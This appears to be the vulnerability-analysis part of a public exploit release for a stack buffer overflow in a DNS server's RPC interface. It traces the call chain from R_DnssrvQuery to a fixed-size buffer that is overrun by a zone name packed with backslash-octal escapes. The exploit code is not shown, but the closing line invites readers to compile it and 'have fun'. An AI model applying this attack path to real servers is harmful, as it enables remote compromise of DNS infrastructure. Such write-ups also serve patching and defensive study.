  Vulnerability Analysis:

  The function Lookup_ZoneTreeNodeFromDottedName() uses a fixed local buffer
to convert
  a string calling Name_ConvertFileNameToCountName(), this string can
contain back-slash
  octal characters. Although some bounds checks are done when writting to
the buffer is
  still possible to bypass them using a string with multiple backslashed
chars, resulting
  in a stack based buffer overflow.

  This function can be reached through DNS RPC Interface, the execution flow

  will be as follows:

  R_DnssrvQuery(pa,buggybuffer,pc,DesiredAccess,pd);                  // RPC
Exported function
  R_DnssrvQuery2(0,0,pa,buggybuffer,pc,DesiredAccess,pd);
  RpcUtil_FindZone(buggybuffer,1,DesiredAccess);
  Zone_FindZoneByName(buggybuffer);                                   //
Here we go!
  Lookup_ZoneTreeNodeFromDottedName(buggybuffer,0,0x2000000);
            Name_ConvertFileNameToCountName(localbuffer,buggybuffer,0); //
Using fixed size local buffer
                    extractQuotedChar(x,x,buggybuffer);               //
Extract octal number

  Just compile the code with nmake and have fun!
